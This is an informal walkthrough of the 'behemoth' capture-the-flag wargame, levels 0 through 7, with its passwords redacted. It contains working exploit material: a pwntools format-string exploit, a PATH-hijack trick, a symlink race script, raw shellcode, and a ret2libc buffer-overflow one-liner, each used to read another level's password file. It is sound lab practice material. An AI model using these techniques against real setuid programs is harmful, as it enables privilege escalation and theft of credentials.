behemoth 0 - 
	gdb, break at where it loads the string to compare, == "eatmyshorts"
	
	cat /etc/behemoth_pass/behemoth1
	<pw_here>
	
behemoth 1 -
	basic overflow.  We over flow with 67 characters + 4 to get to the return.  so we can just overwrite return with system then JUNK then /bin/sh. and shell.. 
	
	cat /etc/behemoth_pass/behemoth2
	<pw_here>
	
behemoth 2 -
	this program uses snprintf to set up the string called from system.. and gets the pid as the name of the file.  system calls touch.  
	so we can just place something on the path before the real touch would be found.  add /tmp/pwoer2/ to the path.  create touch with /bin/sh in it.  chmod +x. 
	run behemoth2 and shell
	
	
	cat /etc/behemoth_pass/behemoth3
	<pw_here>
	
behemoth 3 - 
	no protections, no aslr, user input then outputs user input. probably format string vuln.
	
	this was a pain in the ass due to environment variable changes (forgot about the differences when you run it with full path..)
	
	---
	from pwn import *

	puts_got = 0x80497ac

	address1 = p32(puts_got)
	address2 = p32(puts_got + 2)

	inp = raw_input("Shellcode lower word: ")
	num = int(inp,16)

	# shellcode in env variable 
	# sc="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
	# sc at 0xffffde8e
	# de8e -> 56974 -> 56974 - 8 = 56966
	# ffff -> 65535 -> 65535 - 56974 = 8561
	payload = address1
	payload += address2
	payload += '%'+str(num-8)+'x'
	payload += '%1$hn'
	payload += '%'+str(65535-num)+'x'
	payload += '%2$hn'

	print payload

	#r = process(["/tmp/pwoer3/behemoth3"], shell=True)
	r = process(["/behemoth/behemoth3"], shell=True)
	r.sendline(payload)
	print r.recvline()
	r.interactive()
	---
	
	So this code uses the puts@got.plt address that was found using gdb.  We have to replace the 2 words that cover the address at puts@got.plt, so we create address1 and address2 (2 bytes further).
	
	I was getting frustrated with calculating these format string numbers so i just let myself input them when i ran the exploit. lol 
	the input is the lower word for the shellcode address (the top word always being ffff)
	it then converts that hex into a decimal number and subtracts 8 (the number of bytes for the 2 addresses that we are writing to) 
	this is our value for the bottom word of our target address 
	it then takes ffff and subtracts the user provided number from it, to get our top word of the target address (ffff)
	
	I realized, after a lot of messing around, that the differences in the paths causes the environment variable with our shellcode to jump around a little.
	I had copied the elf file to my tmp dir in order to get core dumps when run.. Using that tmp elf, i had to count the length of the path and then count the length of the path for the actual elf file.  Using that comparison, I edited the shellcode address accordingly.  That is.. the address was at ffffdf23 and my test path was 21 bytes in length and my target path was 19 bytes.. that means my env variable address will be 4 higher (2 for every byte difference) than what i'm being told.   so getenv provided ffffdf23.. I changed that to ffffdf27 and got a shell. 
	
	$ cat /etc/behemoth_pass/behemoth4
	<pw_here>
	$ id
	uid=13003(behemoth3) gid=13003(behemoth3) euid=13004(behemoth4) groups=13003(behemoth3)
	
	
behemoth 4 - 
	gets pid with getpid
	puts
	fopen
	putchar
	fgetc
	sprintf
	fopen
	fclose
	
	getpid
	sprintf - write pid into format string (/tmp/%d) with ebp-0x28 as the target buffer
	fopen - filename created from sprintf (with the pid in it) mode stored at 0x80486c8
	pointer to file stored in ebp-0x10
	sleep 1 sec
	puts 0x80496d9 - "Finished sleeping, fgetcing"
	while != EOF:
		fgetc - ebp-0x10 (pointer to file) -> ebp-0x14
		putchar - ebp-0x14
	this seems like we should be able to get it to read the behemoth5 password file with a symbolic link to the file but we'd have to create it mid execution..  doing it while in gdb seems to cause an error
	in bash, $! gives you the process id of the previously executed process.. which is exactly what we need. 
	then we can try to time it to pause the process, create the symbolic link, then continue the process to print the password.
	not sure if the timing of it will work but we can try it.  
	suspending a process requires the use of kill -STOP and kill -CONT.
	--- forgot to add & to the behemoth4 execution so it backgrounds and can continue our process manipulation DURING execution.
	#!/bin/bash
	
	/behemoth/behemoth4&
	PID=$!
	kill -STOP $PID
	ln -s /etc/behemoth_pass/behemoth5 /tmp/$PID
	kill -CONT $PID
	---
	
	behemoth4@behemoth:/tmp/pwoer4$ vim sol.sh
	behemoth4@behemoth:/tmp/pwoer4$ chmod +x sol.sh 
	behemoth4@behemoth:/tmp/pwoer4$ ./sol.sh
	behemoth4@behemoth:/tmp/pwoer4$ Finished sleeping, fgetcing
	<pw_here>
	
behemoth5 - 
	copied to my tmp dir and apparently the basic functionality requires access to fopen a file that my user does not have access to.  will need to run the original only for testing (after we take a look inside for a bit)
	
	behemoth5@behemoth:/tmp/pwoer5$ ./behemoth5 
	fopen: Permission denied

	fopen hardcoded filename and mode -> fopen([0x80489a2], [0x80489a0]) -> ebp-0x10
	fseek([ebp-0x10], 0, 2)   
	ftell([ebp-0x10])  -> ebp-0xc
	rewind([ebp-0x10]) -> sets filestream to beginning of file 
	malloc(ebp-0xc)   allocates bytes? -> address stored in ebp-0x14
	fgets([ebp-0x14],[ebp-0xc], [ebp-0x10])  ->   fgets(allocated_memory, num_to_read, opened_file)
	gets strlen of whats in allocated_memory 
	fclose
	gethostbyname(0x80489c5)
	socket(2,2,0)		---- important detail here is the type is 2 = #define SOCK_DGRAM	2  so its UDP
	htons(atoi(0x80489e4))
	seems like its sending something from the file to a specified hostname... maybe we can redirect that hostname back to localhost and see what it says with a nc listener? 
	stepping in to the function, the file it is opening and reading is /etc/behemoth_pass/behemoth6
	so that seems like the solution here.. 
	we are going to have to figure out a way to capture what is being sent out of this socket. 
	continuing on debugging, we see at the socket.  it's sending it out to localhost on port 1337.. we can just open up a nc listener and capture the password.  
	
	nc -ulvp 1337
	
	<pw_here>
	
behemoth6 - 
	running the file, it says 
		"Incorrect output."
	passing in an arg, same result.
	has strcmp, execl, malloc, fread, popen
	
	This file calls behemoth6_reader, which loads shellcode into memory from shellcode.txt.  It checks for \x0b in the shellcode so need to create some without that bad char. 
	
	behemoth6@behemoth:/tmp/pwoer6$ /behemoth/behemoth6_reader
	$ id
	uid=13006(behemoth6) gid=13006(behemoth6) groups=13006(behemoth6)
	
	now lets check what happens in the first elf file that prevents the final shell. 
	
	it opens a process for the reader, then uses it as a stream to write into allocated memory.  compares that to the string "HelloKitty".  so we need to write some shellcode that will echo HelloKitty and then we'll get a shell.
	
	behemoth6@behemoth:/tmp/pwoer6$ python -c 'print "\xb8\x98\x0f\x5c\x19\xdb\xc8\xd9\x74\x24\xf4\x5f\x31\xc9\xb1\x0e\x31\x47\x13\x83\xc7\x04\x03\x47\x97\xed\xa9\x73\xac\xa9\xc8\xd6\xd4\x21\xc6\xb5\x91\x55\x70\x15\xd2\xf1\x81\x01\x3b\x60\xeb\xbf\xca\x87\xb9\xd7\xde\x47\x3e\x28\xbb\x24\x56\x47\x63\x8c\xee\xf2\x0f\xbe\x81\xb7\xa6\x4a\x2a\x31\x1f\xb3\x85\x92\xd6\x52\xe4\x95"' > shellcode.txt
	behemoth6@behemoth:/tmp/pwoer6$ /behemoth/behemoth6
	Correct.
	$ id
	uid=13007(behemoth7) gid=13006(behemoth6) groups=13006(behemoth6)
	$ cat /etc/behemoth_pass/behemoth7
	
	<pw_here>
	
behemoth7 - 
	running the file does nothing
	uses strcpy, exit, strlen, fprintf, memset
	
	strcpy is the overflow.  EIP overwrite is at 0x210 
	it seems to check for shellcode somehow. clears out env variables. 
	can straight up overwrite EIP.. will probably just do some alpha encoding and jump back to it in the stack..  maybe find some nops that are alpha.  
	A little more testing before going that route... it seems to check in the initial overflow values but once it passes the buffer length, it doesn't check anymore... so just A's until overflow and overwrite EIP with system, JUNK, /bin/sh. done.
	
	(gdb) p system
	$1 = {<text variable, no debug info>} 0xf7e4c850 <system>		<----------
	(gdb) source /usr/local/peda/peda.py
	gdb-peda$ find /bin
	Searching for '/bin' in: None ranges
	Found 12 results, display max 12 items:
	   libc : 0xf7f6ecc8 ("/bin/sh")						<---------
	   libc : 0xf7f70257 ("/bin:/usr/bin")
	   libc : 0xf7f70260 ("/bin")
	   libc : 0xf7f7081e ("/bin/csh")
	   libc : 0xf7f71c06 ("/bindresvport.blacklist")
	   libc : 0xf7f744a4 ("/bin:/usr/bin")
	   libc : 0xf7f744ad ("/bin")
	[stack] : 0xffffde56 ("/bin/gdb")
	[stack] : 0xffffdf4f ("/bin/bash")
	[stack] : 0xffffdfa1 ("/bin:/usr/bin:/bin:/usr/local/games:/usr/games")
	[stack] : 0xffffdfaa ("/bin:/bin:/usr/local/games:/usr/games")
	[stack] : 0xffffdfaf ("/bin:/usr/local/games:/usr/games")
	gdb-peda$ quit
	behemoth7@behemoth:/tmp/pwoer7$ /behemoth/behemoth7 $(python -c "print 'A'*0x210 + '\x50\xc8\xe4\xf7' + 'JUNK' + '\xc8\xec\xf6\xf7'")
	$ id
	uid=13007(behemoth7) gid=13007(behemoth7) euid=13008(behemoth8) groups=13007(behemoth7)
	$ cat /etc/behemoth_pass/behemoth8
	
	<pw_here>
